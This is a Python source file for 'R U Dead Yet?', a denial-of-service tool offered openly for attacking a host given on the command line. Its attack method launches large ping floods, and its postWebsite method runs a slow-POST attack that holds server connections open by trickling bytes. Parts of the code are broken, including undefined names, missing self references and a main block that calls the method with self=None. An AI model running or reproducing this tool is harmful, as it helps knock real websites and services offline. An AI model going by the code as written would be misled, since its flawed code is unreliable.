from __future__ import generators
import argparse
import threading
import socket
import time
import os
import platform
import subprocess

__author__      =  "John Melody Me <Johnmelodyme@icloud.com>"
__version__     =  "1.0.0"
__copyright__   =  "Copyright (c) 2023-2050 John Melody Me"
__license__     =  "MIT"

class Rudy:
    def __init__(self):
        self.DEFAULT_OUTPUT_ENCODING :str = "utf-8"
        self.MAX_CONNECTIONS         :int = 50
        self.SLEEP_TIME              :int = 10
        self.PROXY_ADDRESS           :str = "127.0.0.1"
        self.PROXY_PORT              :int = 9050
        self.WEBSITE_PORT_RUNNING    :bool = True
        self.running = True

    def attack(self, host :str, port :int, length :int, time_wait :int, thread_nbr :int = 512):
        global WEBSITE_PORT_RUNNING
        
        for i in range(1, thread_nbr):
            host_ = host + str(i)

            command = ['ping', '-c', '100000000000', '-s', '65000', host_, '-v', '-q']

            print("{} threads started to attack {}:{}!\r".format(i+1, host, port), end="")
            
            subprocess.check_output(command)
                
    def formsToDictionary(self, forms):
        try:
            form_dict = {
                "action" : form.get("action", ""),
                "method" : form.get("method", "post"),
                "id" : form.get("id", ""),
                "class" : form.get("class", ""),
                "inputs" : [],
            }

            for index, input_field in enumerate(form.findAll("input")):
                form_dict["inputs"].append({
                    "id" : input_field.get("id", ""),
                    "class" : input_field.get("class", ""),
                    "name" : input_field.get("name", ""),
                    "value" : input_field.get("value", ""),
                    "type" : input_field.get("type", ""),
                })
            
            return form_dict
        except:
            raise Exception("formsToDictionary/1, failed to get form_dict")

    def postWebsite(self, host :str, port :int = 0x50, length :int = 0x400, time_wait :int = 0x1, thread_mode = False):
        request :str = "POST / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nContent-type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n".format(host, length).encode("ascii")

        socket_ :object = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try: 
            socket_.connect((host, port))
        except:
            raise Exception("The server unable to handle more connection at this time.")
            return 
        
        socket_.send(request)

        for i in range(length):
            if not self.WEBSITE_PORT_RUNNING and thread_mode: return

            try:
                socket_.send(b" ")
            except:
                socket_.close()
                postWebsite(host, port, length, time_wait)

            time.sleep(time_wait)

        socket_.close()
        postWebsite(host, port, length, time_wait)

        return

    
        

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="R U Dead Yet?")
    parser.add_argument("host", help="Hostname of the target to focus")
    parser.add_argument("-p", "--port", metavar="port", type=int, default=80, help="Port of the target to focus")
    parser.add_argument("-l", "--length", metavar="packet_len", type=int, default=1024, help="Length of the TCP Packet (without HTTP header)")
    parser.add_argument("-t", "--time", metavar="packet_time", default=1, help="Amount of time to wait between two TCP packets send.")
    parser.add_argument("-n", "--thread", metavar="count", default=512, help="Amount of clients that are going to contact the server.")
    args = parser.parse_args()
    
    Rudy.attack(
        self=None,
        host=args.host, 
        port=int(args.port), 
        length=int(args.length), 
        time_wait=int(args.time), 
        thread_nbr=int(args.thread)
    )